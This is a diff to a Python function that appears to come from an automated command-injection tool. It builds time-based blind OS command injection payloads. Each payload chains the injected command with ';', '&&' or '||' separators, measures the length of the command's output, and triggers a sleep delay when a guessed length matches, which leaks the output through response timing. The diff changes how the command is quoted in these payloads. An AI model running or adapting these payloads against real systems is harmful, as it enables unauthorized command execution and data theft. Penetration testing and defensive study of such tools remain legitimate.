@@ -65,7 +65,7 @@ def decision(separator,TAG,j,delay,http_request_method):
 def cmd_execution(separator,cmd,j,delay,http_request_method):
   if separator == ";" :
     payload = (separator + " "
-	      "str=$("+ cmd +")" + separator +
+	      "str=$(" + cmd + ")" + separator +
 	      "str1=${#str}" + separator +
 	      "if [ \"" + str(j) + "\" != ${str1} ]; " +
 	      "then sleep 0" + separator +
@@ -81,7 +81,7 @@ def cmd_execution(separator,cmd,j,delay,http_request_method):
       ampersand = "&"
     payload = (ampersand + " " +
 	      "sleep 0  " + separator + " "
-	      "str=$(\""+cmd+"\")  " + separator + " "
+	      "str=$(" + cmd + ")  " + separator + " "
 	      # Find the length of the output.
 	      "str1=${#str}  " + separator + " "
 	      "[ " + str(j) + " -eq ${str1} ] " + separator + " "
@@ -92,7 +92,7 @@ def cmd_execution(separator,cmd,j,delay,http_request_method):
       
   if separator == "||" :
     payload = (separator + " "
-	      "[ "+str(j)+" -ne $(\""+cmd+"\" | wc -c) ] " + separator + 
+	      "[ "+str(j)+" -ne $(" + cmd + " | wc -c) ] " + separator + 
 	      "sleep " + str(delay) + " "
 	      )
   return payload
